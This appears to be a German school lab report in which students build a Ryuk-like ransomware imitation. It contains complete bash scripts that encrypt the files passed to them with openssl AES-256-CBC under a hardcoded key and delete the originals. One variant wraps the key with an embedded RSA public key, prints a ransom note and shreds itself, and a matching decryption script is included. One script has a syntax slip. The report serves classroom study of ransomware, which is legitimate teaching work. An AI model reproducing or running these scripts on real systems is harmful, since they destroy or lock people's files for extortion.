# Ryuk-Ransomware

| Kategorie | Wert |
| ---- | ---- |
| Klasse | 5AHITS |
| Verfasser | Xu Matthias Chen, Jonas Franz Wolfbauer |
| Datum | 29.09.2026 |
| Fach | ITSE (Übungen) |
| Link | https://www.franzmatejka.at/htl/doc/ITSI/lab/ransom_ryuk/01_ryuk.html |

## Übung 1.2 (Ryuk - Red Team)

Erstellen des bash-scripts mit openssl für encryption ohne rsa encryption:

```bash
#!/bin/bash

        for arg in "$@";
        do
                echo "Argument: $arg"

                if [ "$arg" == "$0" ];
                then
                        continue
                elif[ -d "$arg" ];
                then
                        continue
                else                                                                                                                                                                                                                                                                                                                                       
                        openssl aes-256-cbc -in "$arg" -K '0106eb4887051520fcf40b5e8fa5acceab272785c1055ce53e3c201b1d3441fe' -iv '0' -out "${arg}.enc"
                        rm "$arg"
                fi
        done
        
        echo "Horst was here."
        echo "!!! === YOUR FILES ARE ENCRYPTED === !!!"
        echo "Pay a ransom of 5 Yuan to get your files back - wallet address: horst@lichter.de"
 
        echo ""
        echo "At this point, this file should but won't delete itself right now."
```

## Übung 1.3 (Ryuk - Blue Team)

Erstellen des RSA Key für das verschlüsseln des aes-victim-key:
```
ssh-keygen -t rsa -b 4096 
```

Erstellen des attacker-script mit encryption von dem aes_key_file mithilfe das public keys:

```
#!/bin/bash

RSA_KEY_PUBLIC="-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvEsUVGJ9vC2BQZSq8NGo
bLQE/GcLjPIU+StpElDorz11UG+NYW9daPO3OjnXa6Zo4yXLTzFJxCqqJRzqbbED
5b9rOA3Rs1dGOuSNSbEJPrjKsOi+2s1ZpGOFsx8wcSkWtTeD0mTvN09tBrMtfK6b
uLAVRUQGCJ/haBTfBdy9Pnq30atfcP9Hx4/HK6xgatn/fs7U34VIqVyiVDvXVf7u
Rwoo4jaKgtghvn3BmoXbXKWdmNyRdaYAtH6onblrPypj3nGZVPWrp0hglME7Qcl0
yXSUAe7a22IpP6Ooh9+XvLjvlIYQNOHt4TZTH9wZovqP5xekSRvr3iUhnaXa1+rr
XpiTAutSxUlp46Ow2yn3n1bNXJbQHD+/eJQ90nFJxcDDmqoujmMSSKD8uCLAV8Uh
TpDWDolwB0lqTwjMgG7ieWCdZc0O1rKFfeC/hPsEtCKWsJsiRmeCrBzh/N3ZrTWC
QXr+Gjwlw3NkPk7DP2qaFHo2IUNaXIFqvvCDjtSxPSjXLP/uKrXkseZhaEqBGoDD
EvicwLN6OsIFEfgVeuusULmvEkun70GvN6KGhm8FZVaadizxa+PfOYPDs1LO82mK
3rqP33t2FEOzyFEkYeBsZe142st3tCye/Hdz/45UKZuY9VS45uholqh4NDZ+nI7V
IXmovvbD3W7PJN9EHyFk5kUCAwEAAQ==
-----END PUBLIC KEY-----"

        for arg in "$@";
        do
                echo "Argument: $arg"

                if [ "$arg" == "$0" ];
                then
                        continue
                elif [ -d "$arg" ];
                then
                        continue
                else
                        openssl aes-256-cbc -in "$arg" -K '0106eb4887051520fcf40b5e8fa5acceab272785c1055ce53e3c201b1d3441fe' -iv '0' -out "${arg}.enc"
                        rm "$arg"
                fi
        done

touch "aes_victim_key"
echo "0106eb4887051520fcf40b5e8fa5acceab272785c1055ce53e3c201b1d3441fe" > aes_victim_key


openssl pkeyutl -encrypt -pubin -inkey <(echo "$RSA_KEY_PUBLIC") -in aes_victim_key -out aes_victim_key.PayRansom
rm aes_victim_key

echo "Horst Lichter was here."
echo "!!! === YOUR FILES ARE ENCRYPTED === !!!"
echo "Pay a ransom of 5 Yuan to get your files back - wallet address: horst@lichter.de"

echo ""
echo "At this point, this file shreds itself."

shred -u -- "$0"
 ```


Erstellen von dem paid-script:

 ```
#!/bin/bash

for arg in "$@";
do
        if [[ "$arg" == "$0" ]];
        then
                continue
        elif [[ -d "$arg" ]];
        then
                continue
        else
                # blabla
                openssl aes-256-cbc -d -in "${arg}" -K '0106eb4887051520fcf40b5e8fa5acceab272785c1055ce53e3c201b1d3441fe' -iv '0' -out "${arg%.enc}"

                rm "$arg"
        fi
done
```